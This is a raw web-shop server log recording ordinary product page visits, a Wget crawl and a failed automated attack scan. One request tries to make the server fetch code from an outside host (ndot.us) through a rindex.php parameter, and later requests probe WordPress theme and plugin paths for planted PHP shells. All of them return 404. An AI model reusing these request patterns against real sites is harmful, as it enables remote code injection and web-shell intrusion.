[2023-05-07 15:13:04,667266] front.INFO  [NULL] [a2dd51aa] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /products/detail/69, 34.105.37.64, NULL, Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko]
[2023-05-07 15:13:04,668051] front.INFO  [NULL] [a2dd51aa] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["product_detail"]  [GET, /products/detail/69, 34.105.37.64, NULL, Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko]
[2023-05-07 15:13:04,679774] front.INFO  [bf505da4] [a2dd51aa] [NULL] [LogListener:onKernelController:73] - LOGIC START ["product_detail"]  [GET, /products/detail/69, 34.105.37.64, NULL, Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko]
[2023-05-07 15:13:04,714698] front.INFO  [bf505da4] [a2dd51aa] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["product_detail"]  [GET, /products/detail/69, 34.105.37.64, NULL, Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko]
[2023-05-07 15:13:04,715477] front.INFO  [bf505da4] [a2dd51aa] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["product_detail"]  [GET, /products/detail/69, 34.105.37.64, NULL, Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko]
[2023-05-07 15:15:25,077923] front.INFO  [NULL] [59ebb069] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /rindex.php?parameter=RxRqlgha.php%7Chttp://ndot.us/za&action=add, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,079363] front.INFO  [NULL] [59ebb069] [NULL] [LogListener:onKernelException:105] - No route found for "GET /rindex.php" [404]  [GET, /rindex.php?parameter=RxRqlgha.php%7Chttp://ndot.us/za&action=add, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,081248] front.INFO  [82a5248f] [59ebb069] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /rindex.php?parameter=RxRqlgha.php%7Chttp://ndot.us/za&action=add, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,081668] front.INFO  [82a5248f] [59ebb069] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /rindex.php?parameter=RxRqlgha.php%7Chttp://ndot.us/za&action=add, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,277332] front.INFO  [NULL] [4e07301f] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /RxRqlgha.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,278634] front.INFO  [NULL] [4e07301f] [NULL] [LogListener:onKernelException:105] - No route found for "GET /RxRqlgha.php" [404]  [GET, /RxRqlgha.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,280087] front.INFO  [3995dffb] [4e07301f] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /RxRqlgha.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,280419] front.INFO  [3995dffb] [4e07301f] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /RxRqlgha.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,480991] front.INFO  [NULL] [29873751] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-content/themes/classic/inc/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,482334] front.INFO  [NULL] [29873751] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-content/themes/classic/inc/index.php" [404]  [GET, /wp-content/themes/classic/inc/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,483754] front.INFO  [5000b19f] [29873751] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-content/themes/classic/inc/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,484093] front.INFO  [5000b19f] [29873751] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-content/themes/classic/inc/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,693596] front.INFO  [NULL] [88357ffa] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-content/themes/classic/inc/RxRgsjmw.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,694835] front.INFO  [NULL] [88357ffa] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-content/themes/classic/inc/RxRgsjmw.php" [404]  [GET, /wp-content/themes/classic/inc/RxRgsjmw.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,696267] front.INFO  [24296a21] [88357ffa] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-content/themes/classic/inc/RxRgsjmw.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,696552] front.INFO  [24296a21] [88357ffa] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-content/themes/classic/inc/RxRgsjmw.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,896076] front.INFO  [NULL] [519fa3d7] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-content/themes/classic/inc/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,897417] front.INFO  [NULL] [519fa3d7] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-content/themes/classic/inc/index.php" [404]  [GET, /wp-content/themes/classic/inc/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,898855] front.INFO  [e000a1b5] [519fa3d7] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-content/themes/classic/inc/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:25,899143] front.INFO  [e000a1b5] [519fa3d7] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-content/themes/classic/inc/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,090204] front.INFO  [NULL] [35f15683] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-content/themes/classic/inc/RxRfmzvx.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,091548] front.INFO  [NULL] [35f15683] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-content/themes/classic/inc/RxRfmzvx.php" [404]  [GET, /wp-content/themes/classic/inc/RxRfmzvx.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,092936] front.INFO  [bcdd0435] [35f15683] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-content/themes/classic/inc/RxRfmzvx.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,093281] front.INFO  [bcdd0435] [35f15683] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-content/themes/classic/inc/RxRfmzvx.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,292334] front.INFO  [NULL] [4a449a26] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-content/plugins/core-stab/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,293518] front.INFO  [NULL] [4a449a26] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-content/plugins/core-stab/index.php" [404]  [GET, /wp-content/plugins/core-stab/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,294971] front.INFO  [840d526e] [4a449a26] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-content/plugins/core-stab/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,295298] front.INFO  [840d526e] [4a449a26] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-content/plugins/core-stab/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,491650] front.INFO  [NULL] [e098c3a2] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-content/plugins/core-stab/RxRbbodf.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,493103] front.INFO  [NULL] [e098c3a2] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-content/plugins/core-stab/RxRbbodf.php" [404]  [GET, /wp-content/plugins/core-stab/RxRbbodf.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,494849] front.INFO  [db217c5d] [e098c3a2] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-content/plugins/core-stab/RxRbbodf.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,495188] front.INFO  [db217c5d] [e098c3a2] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-content/plugins/core-stab/RxRbbodf.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,686880] front.INFO  [NULL] [3a0fbaba] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-content/plugins/core-stab/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,688015] front.INFO  [NULL] [3a0fbaba] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-content/plugins/core-stab/index.php" [404]  [GET, /wp-content/plugins/core-stab/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,689314] front.INFO  [f1a12cc2] [3a0fbaba] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-content/plugins/core-stab/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,689591] front.INFO  [f1a12cc2] [3a0fbaba] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-content/plugins/core-stab/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,887294] front.INFO  [NULL] [2d3e234f] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-content/plugins/core-stab/RxRlwjkd.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,888453] front.INFO  [NULL] [2d3e234f] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-content/plugins/core-stab/RxRlwjkd.php" [404]  [GET, /wp-content/plugins/core-stab/RxRlwjkd.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,889805] front.INFO  [fcaf40aa] [2d3e234f] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-content/plugins/core-stab/RxRlwjkd.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:26,890100] front.INFO  [fcaf40aa] [2d3e234f] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-content/plugins/core-stab/RxRlwjkd.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:27,079884] front.INFO  [NULL] [fa0ccaca] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-content/plugins/core-stab/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:27,080994] front.INFO  [NULL] [fa0ccaca] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-content/plugins/core-stab/index.php" [404]  [GET, /wp-content/plugins/core-stab/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:27,082228] front.INFO  [ad6e5b02] [fa0ccaca] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-content/plugins/core-stab/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:27,082481] front.INFO  [ad6e5b02] [fa0ccaca] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-content/plugins/core-stab/index.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:27,280482] front.INFO  [NULL] [63571def] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /wp-content/plugins/core-stab/RxRhnesw.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:27,281611] front.INFO  [NULL] [63571def] [NULL] [LogListener:onKernelException:105] - No route found for "GET /wp-content/plugins/core-stab/RxRhnesw.php" [404]  [GET, /wp-content/plugins/core-stab/RxRhnesw.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:27,282741] front.INFO  [faee9dd3] [63571def] [NULL] [LogListener:onKernelResponse:86] - LOGIC END [null]  [GET, /wp-content/plugins/core-stab/RxRhnesw.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:15:27,283041] front.INFO  [faee9dd3] [63571def] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END [null]  [GET, /wp-content/plugins/core-stab/RxRhnesw.php, 188.166.208.28, NULL, Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36]
[2023-05-07 15:32:39,340850] front.INFO  [NULL] [fdf44358] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /products/list?category_id=, 118.27.125.70, NULL, Wget/1.14 (linux-gnu)]
[2023-05-07 15:32:39,341618] front.INFO  [NULL] [fdf44358] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["product_list"]  [GET, /products/list?category_id=, 118.27.125.70, NULL, Wget/1.14 (linux-gnu)]
[2023-05-07 15:32:39,350083] front.INFO  [bea24a39] [fdf44358] [NULL] [LogListener:onKernelController:73] - LOGIC START ["product_list"]  [GET, /products/list?category_id=, 118.27.125.70, NULL, Wget/1.14 (linux-gnu)]
[2023-05-07 15:32:39,428710] front.INFO  [bea24a39] [fdf44358] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["product_list"]  [GET, /products/list?category_id=, 118.27.125.70, NULL, Wget/1.14 (linux-gnu)]
[2023-05-07 15:32:39,429259] front.INFO  [bea24a39] [fdf44358] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["product_list"]  [GET, /products/list?category_id=, 118.27.125.70, NULL, Wget/1.14 (linux-gnu)]
[2023-05-07 15:32:41,299317] front.INFO  [NULL] [25ec0df1] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /products/list?category_id=, 118.27.125.70, NULL, Wget/1.14 (linux-gnu)]
[2023-05-07 15:32:41,299789] front.INFO  [NULL] [25ec0df1] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["product_list"]  [GET, /products/list?category_id=, 118.27.125.70, NULL, Wget/1.14 (linux-gnu)]
[2023-05-07 15:32:41,307202] front.INFO  [37d6efb1] [25ec0df1] [NULL] [LogListener:onKernelController:73] - LOGIC START ["product_list"]  [GET, /products/list?category_id=, 118.27.125.70, NULL, Wget/1.14 (linux-gnu)]
[2023-05-07 15:32:41,366574] front.INFO  [37d6efb1] [25ec0df1] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["product_list"]  [GET, /products/list?category_id=, 118.27.125.70, NULL, Wget/1.14 (linux-gnu)]
[2023-05-07 15:32:41,367178] front.INFO  [37d6efb1] [25ec0df1] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["product_list"]  [GET, /products/list?category_id=, 118.27.125.70, NULL, Wget/1.14 (linux-gnu)]
[2023-05-07 15:33:32,490280] front.INFO  [NULL] [5c135a8c] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /products/detail/74, 106.146.12.34, http://kunipuro.com/, Mozilla/5.0 (Linux; Android 13; SCG16) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36]
[2023-05-07 15:33:32,490987] front.INFO  [NULL] [5c135a8c] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["product_detail"]  [GET, /products/detail/74, 106.146.12.34, http://kunipuro.com/, Mozilla/5.0 (Linux; Android 13; SCG16) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36]
[2023-05-07 15:33:32,499342] front.INFO  [3fb8b4f4] [5c135a8c] [NULL] [LogListener:onKernelController:73] - LOGIC START ["product_detail"]  [GET, /products/detail/74, 106.146.12.34, http://kunipuro.com/, Mozilla/5.0 (Linux; Android 13; SCG16) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36]
[2023-05-07 15:33:32,531321] front.INFO  [3fb8b4f4] [5c135a8c] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["product_detail"]  [GET, /products/detail/74, 106.146.12.34, http://kunipuro.com/, Mozilla/5.0 (Linux; Android 13; SCG16) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36]
[2023-05-07 15:33:32,532184] front.INFO  [3fb8b4f4] [5c135a8c] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["product_detail"]  [GET, /products/detail/74, 106.146.12.34, http://kunipuro.com/, Mozilla/5.0 (Linux; Android 13; SCG16) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36]
[2023-05-07 15:33:34,091569] front.INFO  [NULL] [dbf314f6] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /products/detail/74, 34.150.223.83, NULL, Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko]
[2023-05-07 15:33:34,092099] front.INFO  [NULL] [dbf314f6] [NULL] [LogListener:onKernelRequest:60] - PROCESS START ["product_detail"]  [GET, /products/detail/74, 34.150.223.83, NULL, Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko]
[2023-05-07 15:33:34,099842] front.INFO  [d0b9e24c] [dbf314f6] [NULL] [LogListener:onKernelController:73] - LOGIC START ["product_detail"]  [GET, /products/detail/74, 34.150.223.83, NULL, Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko]
[2023-05-07 15:33:34,125980] front.INFO  [d0b9e24c] [dbf314f6] [NULL] [LogListener:onKernelResponse:86] - LOGIC END ["product_detail"]  [GET, /products/detail/74, 34.150.223.83, NULL, Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko]
[2023-05-07 15:33:34,126511] front.INFO  [d0b9e24c] [dbf314f6] [NULL] [LogListener:onKernelTerminate:95] - PROCESS END ["product_detail"]  [GET, /products/detail/74, 34.150.223.83, NULL, Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko]
[2023-05-07 15:35:12,692907] front.INFO  [NULL] [85e7286f] [NULL] [LogListener:onKernelRequestEarly:47] - INIT   [GET, /products/detail/69, 106.146.12.34, http://kunipuro.com/, Mozilla/5.0 (Linux; Android 13; SCG16) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36]
